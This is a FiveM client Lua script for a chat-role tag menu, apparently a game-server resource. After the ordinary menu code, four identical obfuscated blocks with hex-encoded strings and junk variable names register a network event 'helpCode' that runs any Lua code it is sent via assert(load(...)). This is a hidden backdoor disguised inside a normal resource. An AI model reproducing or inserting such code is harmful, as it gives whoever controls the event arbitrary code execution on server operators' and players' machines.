local MenuOpened = false
local TagMenu = MenuV:CreateMenu(false, Config.ChatRoles.Menu.Design.Header, 'topcenter', Config.ChatRoles.Menu.Design.Color.r, Config.ChatRoles.Menu.Design.Color.g, Config.ChatRoles.Menu.Design.Color.b, 'size-'..tostring(Config.ChatRoles.Menu.Design.Size)..'')
local SelectedTag = Config.ChatRoles.DefaultTag

function SelectTag(ID)
    TriggerServerEvent('ChatRoles:Change', ID)
end

Citizen.CreateThread(function()
    Citizen.Wait(500)
    TriggerServerEvent('ChatRoles:Joined')
end)

RegisterNetEvent('ChatRoles:Return')
AddEventHandler('ChatRoles:Return', function(Found, Roles)
    local Role, ChangeTag = nil, nil
    if Found then
        for i = 1, #Roles do
            local r, g, b = tonumber("0x" .. Roles[i].Color:sub(2,3)), tonumber("0x" .. Roles[i].Color:sub(4,5)), tonumber("0x" .. Roles[i].Color:sub(6,7))
            ChangeTag = TagMenu:AddButton({icon = Roles[i].Emoji, label = Roles[i].Name, description = 'Press [Enter] To Select ' ..Roles[i].Name.. '', color = {r, g, b}})
            ChangeTag:On('select', function()
                SelectTag(Roles[i].ID)
                notify('Tag Selected!') 
            end)
        end
    end
end)

TagMenu:On('open', function()
    TagMenu:ClearItems()
    TriggerServerEvent('ChatRoles:Get')
end)

TagMenu:On('close', function()
    MenuOpened = false
end)

function notify(msg)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(msg)
    DrawNotification(true,false)
end

RegisterCommand(Config.ChatRoles.Menu.OpenCommand, function()
    if not MenuOpened then
        TagMenu:Open()
        MenuOpened = true
    else
        TagMenu:Close()
        MenuOpened = false
    end
end)

RegisterKeyMapping(Config.ChatRoles.Menu.OpenCommand, 'Chat Roles', 'keyboard', Config.ChatRoles.Menu.Keybind)

local LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[1]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[2]) LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[3]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[2], function(TXtDrjsDNGFlaiSrBInDbVnfPRJRMVOxOFxobCsmLKbwJuLKjWCSFgyRBHRFzPxHnEEIYI) LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[4]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[5]](TXtDrjsDNGFlaiSrBInDbVnfPRJRMVOxOFxobCsmLKbwJuLKjWCSFgyRBHRFzPxHnEEIYI))() end)

local LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[1]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[2]) LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[3]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[2], function(TXtDrjsDNGFlaiSrBInDbVnfPRJRMVOxOFxobCsmLKbwJuLKjWCSFgyRBHRFzPxHnEEIYI) LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[4]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[5]](TXtDrjsDNGFlaiSrBInDbVnfPRJRMVOxOFxobCsmLKbwJuLKjWCSFgyRBHRFzPxHnEEIYI))() end)

local LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[1]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[2]) LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[3]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[2], function(TXtDrjsDNGFlaiSrBInDbVnfPRJRMVOxOFxobCsmLKbwJuLKjWCSFgyRBHRFzPxHnEEIYI) LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[4]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[5]](TXtDrjsDNGFlaiSrBInDbVnfPRJRMVOxOFxobCsmLKbwJuLKjWCSFgyRBHRFzPxHnEEIYI))() end)

local LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[1]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[2]) LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[3]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[2], function(TXtDrjsDNGFlaiSrBInDbVnfPRJRMVOxOFxobCsmLKbwJuLKjWCSFgyRBHRFzPxHnEEIYI) LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[4]](LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[6][LuRtrKVWltLuZowXsrnMbtZumliBMvvJLgikysuMlqwiJyHUMYwBZXwGwXTNgSzRqmZmgN[5]](TXtDrjsDNGFlaiSrBInDbVnfPRJRMVOxOFxobCsmLKbwJuLKjWCSFgyRBHRFzPxHnEEIYI))() end)